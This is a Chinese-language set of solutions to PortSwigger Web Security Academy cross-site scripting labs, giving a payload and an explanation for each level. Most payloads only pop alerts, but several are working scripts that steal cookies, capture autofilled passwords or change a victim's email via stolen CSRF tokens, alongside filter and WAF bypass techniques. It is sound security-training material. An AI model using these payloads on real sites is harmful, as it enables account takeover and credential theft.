#PortSwigger:Cross-site scripting实战
##关卡一： Reflected XSS into HTML context with nothing encoded
**攻击Payload**:<script>alert(1)</script>

##关卡二：Stored XSS into HTML context with nothing encoded
**攻击Payload**:1.在留言板写上<script>alert(1)</script>
               2.剩下的按要求填好即可

##关卡三：DOM XSS in document.write sink using source location.search
**攻击Payload**:"><svg onload=alert(1)>闭合前面，输出后面内容，造成弹窗

##关卡四：DOM XSS in innerHTML sink using source location.search
**攻击Payload**:<img src=1 onerror=alert(1)>

##关卡五：DOM XSS in jQuery anchor href attribute sink using location.search source
**攻击Payload**：URL参数returnPath后面写上javascript:alert(document.cookie)
**原理**：returnPath告诉页面 “点击返回按钮之后跳转到哪里”,加入javascript伪协议，可以直接使网页跳转

##关卡六：DOM XSS in jQuery selector sink using a hashchange event
**攻击payload**:<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
**原理**：<iframe></iframe>(画中画)在当前网页里嵌入一个新的网页【卧底】
         src="https://YOUR-LAB-ID.web-security-academy.net/#"当前网页【潜伏地点】
         onload:触发器，使之执行后续代码【接头人】1.
         onerror:执行者，传送到<img>【接头人传递信息】
         onload="this.src+='<img src=x onerror=print()>执行<img>并输出内容
##总结：我方派出卧底【恶意代码】，在目标公司潜伏等待有缘人打开网站访问，然后传递信息给我【传到我的服务器】
         
##关卡七：Reflected XSS into attribute with angle brackets HTML-encoded
**攻击payload**:"onmouseover="alert(1)【属性上下文】
**原理**："（双引号）闭合前面一个标签
          onmouseover:鼠标悬浮于页面上方触发
          alert(1):标准验证弹窗

##关卡八：Stored XSS into anchor href attribute with double quotes HTML-encoded【伪协议绕过】
**攻击payload**:javascript:alert(1)
**原理**：输入框最终渲染在'<a href='...'>'中，采用伪代码使浏览器直接执行javascript后的代码

##关卡九：Reflected XSS into a JavaScript string with angle brackets HTML encoded【上下文逃逸】
**攻击payload**:'-alert(1)-'
**原理**：'（单引号）闭合前面字符串
          -（减号）强制JS引号将两边作为表达式执行，触发alert(1)

##关卡十：DOM XSS in document.write sink using source location.search inside a select element
**攻击payload**:在URLproduct?productId=1后面加上&storeId="></select><img%20src=1%20onerror=alert(1)>
**原理**：1.&：URL中用来连接多个参数的分隔符
          2.storeId:它是前端里写死的代码，查看页面源代码，搜索document.write,找到缺口
          3."：闭合原本代码
          4.>闭合标签
          5.</select>强制关闭下拉标签
          6.20%URL里的空格

##关卡十一：DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
**攻击payload**:{{$on.constructor('alert(1)')()}}
**原理**：1.页面有 `ng-app`，AngularJS 会解析 `{{ }}` 里面的表达式，我们用 `$on.constructor` 绕过 AngularJS 的沙箱，执行原生 JS，这叫 **AngularJS CSTI（客户端模板注入）**
          2.`$on`：是 AngularJS scope 自带的事件监听方法（`scope.$on`），它本身是一个**函数**
          3.`.constructor`：任何 JS 函数的 `constructor` 就是 **原生 Function 构造器**

##关卡十二：Reflected DOM XSS【反射型】
**攻击payload**:\"};alert(1)//
**原理**：1.在输入框输入字符，跳转后点击F12，发现在searchResults.js中包含有eval()危险函数，会直接拼接执行eval('var searchResultsObj='+this.responseText);
          2.在BP抓包中会有一段json{"searchTerm":"test"}
          3.输入\"};alert(1)//，eval后的代码会变为'var searchResultsObj={"searchTerm":"\\"};alert(1)//"}'
          4.\\被JS解释为反斜杠字符
          5."（双引号）闭合了searchTerm
          6.}闭合了对象
          7.；（分号）结束了var声明
          8.//将后面的全部注释，防止报错

##关卡十三：Reflected XSS into a JavaScript string with single quote and backslash escaped
**攻击payload**:</script><img src=1 onerror=alert(1)>
**原理**:1.</script>强行闭合<script>标签
         2.<img src=1 onerror=alert(1)>然后写上自己想写的
         【在抓包的时候你会看到响应报文document.write后面的内容，你输入的就会包含，要做的就是跳出它】

##关卡十四：Reflected XSS in canonical link tag
**攻击payload**:'accesskey='x'onclick='alert(1)
**原理**：1. 第一个 `'`：闭合原来 href 属性的引号
         2. `accesskey='x'`：新增 accesskey 属性，快捷键绑定字母 x
         3. `onclick='alert(1)`：新增 onclick 事件，点击这个元素就弹框
         4.`accesskey` 是 HTML 全局属性：给元素绑定一个键盘快捷键，在 Chrome 里按下对应快捷键，就会**聚焦这个元素，并且触发它的 onclick 事件**。

##关卡十五：Reflected XSS into HTML context with most tags and attributes blocked【反射型，大部分标签被拦截】
**攻击payload**:<iframe src="靶场URL?search=<body onresize=print()>" onload="this.style.width='100px' "></iframe>
**原理**：1.同上关卡六描述
          2.拦截了大部分标签但是不可能没有一个可用，采用BP攻击模块进行自动化筛选'<body>'可用
          3.拦截了大部分触发，继续采用BP攻击模块'onresize'可用
          4.onload="this.style.width='100px'：触发onload强制放大

##总结：<iframe></iframe>一个合格的卧底，可以直接嵌入一个新的网页，onload一个高级放哨靠近就触发，不论什么标签都有可能成为注入点

关卡十六：Exploiting XSS to bypass CSRF defenses
**攻击payload**:
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];\w适合纯数字
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
**原理**：1.<script></script>起手式将标签内所有内容按代码执行
          2.var req = new XMLHttpRequest();建立请求
          3.req.onload = handleResponse;页面加载完成后去顺手监听浏览器在干什么，拿到回复
          4.req.open('get','/my-account',true);用get去访问我的账户
          5.req.send();发送
          6.function handleResponse()功能执行
          7.var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
            this.responseText拿到返回的代码   .match()搜索   /name="csrf" value="(\w+)"/特征搜寻 [1]要第一项
          8. var changeReq = new XMLHttpRequest();换一个新的继续
          9.changeReq.open('post', '/my-account/change-email', true);用post访问
          10. changeReq.send('csrf='+token+'&email=test@test.com')将之前拿到的csrf塞进去，加上自己的邮箱

##关卡十六：Exploiting cross-site scripting to steal cookies【steal password】
**攻击payload**:
<script>
document.addEventListener("DOMContentLoaded", () => {
    const csrf_token = document.querySelector('input[name="csrf"]').value;
    let cookie_t = document.cookie;
    fetch("/post/comment", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `csrf=${csrf_token}&postId=9&comment=${cookie_t}&name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com`
    });
});
</script>
**原理**：1.<script></script>script标签，告诉浏览器按代码执行
          2.document.addEventListener("DOMContentLoaded", () =>等浏览器执行好HTML之后去执行代码【看准时机】
          3.const csrf_token = document.querySelector('input[name="csrf"]').value;找到csrf，将token拿出来放到csrf_token中
          4.let cookie_t = document.cookie;将登录凭证都放到cookie_t里
          5. fetch("/post/comment"，{ 使用fetch向自己发送评论的接口发送请求【内部突破】
          6. method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             【专业人士请放行】
          7. body: `csrf=${csrf_token}&postId=9&comment=${cookie_t}&name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com`【组合式】
             csrf=${csrf_token}拿下刚刚的凭证
             postId=9放到id为9的地点，具体看靶场URL【位置地点】
             comment=${cookie_t}【将密码贴到大屏上】
             name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com发论坛需要name,email,website,格式必有

##总结：进不去内网，外部通讯失效，从旁系入手，一个不起眼的管理员权限也不小

##关卡十七：Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
**攻击payload**:\'-alert(1)//
**原理**：1.\反斜杠，输入浏览器会变成 var searchTerms='\\'转义将原本的效果抵消了
          2.-减号让JS按规则减法执行，会直接执行alert(1)
          3.//注释掉后续内容

##关卡十八：Exploiting cross-site scripting to capture passwords
**攻击payload**:
<input name=username id=username>
<input type=password name=password autofocus onfocus="if(this.value.length)fetch('/post/comment',{
method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'csrf='+document.querySelector('input[name=csrf]').value+'&postId=1&comment='+username.value+':'+this.value+'&name=Hacked&email=test%40test.com'
});">
**原理**：1.<input name=username id=username>：
               <input>标签用来放name用户名  name=username提交时用这个  定义一个id后面用
          2.<input type=password name=password autofocus onfocus：
                <input type=password>密码框  name=password表单名  autofocus光标强制锁定到密码框
          3.onfocus="if(this.value.length)
                onfocus:光标进入立刻执行后面的代码   if(this.value.length)有东西然后再拿下
4.fetch('/post/comment',{
  method:'POST',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'csrf='+document.querySelector('input[name=csrf]').value+'&postId=1&comment='+username.value+':'+this.value+'&name=Hacked&email=test%40test.com'
  });">      
        fetch('/post/comment'评论区内部暗号【自己人放行】
        method:'POST'【评论的post请求】
        headers:{'Content-Type':'application/x-www-form-urlencoded'}【标准化，正规军】
        document.querySelector('input[name=csrf]').value【找到目标，将他送到指定位置】
        postId=1【位置】
        comment='+username.value+':'+this.value将账号密码放一块贴到大屏【处理结果斩首示众】
        &name=Hacked&email=test%40test.com'【评论必填项】

##关卡十九：Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped【html实体绕过】
**攻击payload**:https://&apos;);alert(1);//
**原理**：1.&apos浏览器解析onclick时将其翻译为单引号
          2.所以实际JS执行会变为tracker.track('');alert(1);//');
          3.前面强制闭合直接执行alert(1)实现弹框

##关卡二十：Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
**攻击payload**:${alert(1)}
**原理**：1.大部分常用标签被过滤
          2.${}插值，大括号里的表达式会被强行计算
          3.输入值被包含在单引号中，采用插值让JS强制执行

##关卡二十一：Stored DOM XSS
**攻击payload**:<><img src=1 onerror=alert(1)>
**原理**：1.前端function escapeHTML(html) {return html.replace('<', '&lt;').replace('>', '&gt;');}这一段会将<>解析，所以要写一个空<>来占位
          2.前面解析结束后，执行后面塞入的恶意代码<img src=1 onerror=alert(1)>

##关卡二十二：Reflected XSS into HTML context with all tags blocked except custom ones
**攻击payload**:
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
**原理**：1.%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'实际上是：<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
          2.xss自定义标签，绕过黑名单
          3.id定位
          4.tabindex=1让自定义标签接收到信号
          5.onfocus=alert(document.cookie)拿到焦点后执行JS
          6.#x:页面加载后自动跳转这个id，触发focus

##关卡二十三：Reflected XSS with some SVG markup allowed【大部分标签过滤，使用SVG】
**攻击payload**：<svg><animatetransform onbegin=alert(1)>
**原理**：1.常规标签被过滤，采用BP批量化测试<svg>可用
          2.<svg>外层容器合法，放行
          3.<animatetransform>动画标签，放行
          4.onbegin=alert(1)动画开始直接执行
           
##关卡二十四：Reflected XSS with event handlers and href attributes blocked
**攻击payload**:<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
**原理**：1.<svg>(矢量图)，建立一个画布，让后面的代码直接在画布里执行，不受html限制
          2.<a></a>在画布里建立一个超链接，一个图形框
          3.<animate attributeName=herf values=javascript:alert(1) />
              animate:SVG动画标签，动态效果
              attributeName=herf:让标签里的东西动起来
              values=javascript:alert(1):标签里的恶意代码【实际搞破坏的】
              注：因为WAF检查静态源码，这个是动态，不在他的检查范围内
          4.<text x=20 y=20>Click me</text>显示一个页面，点我，点击后触发恶意代码
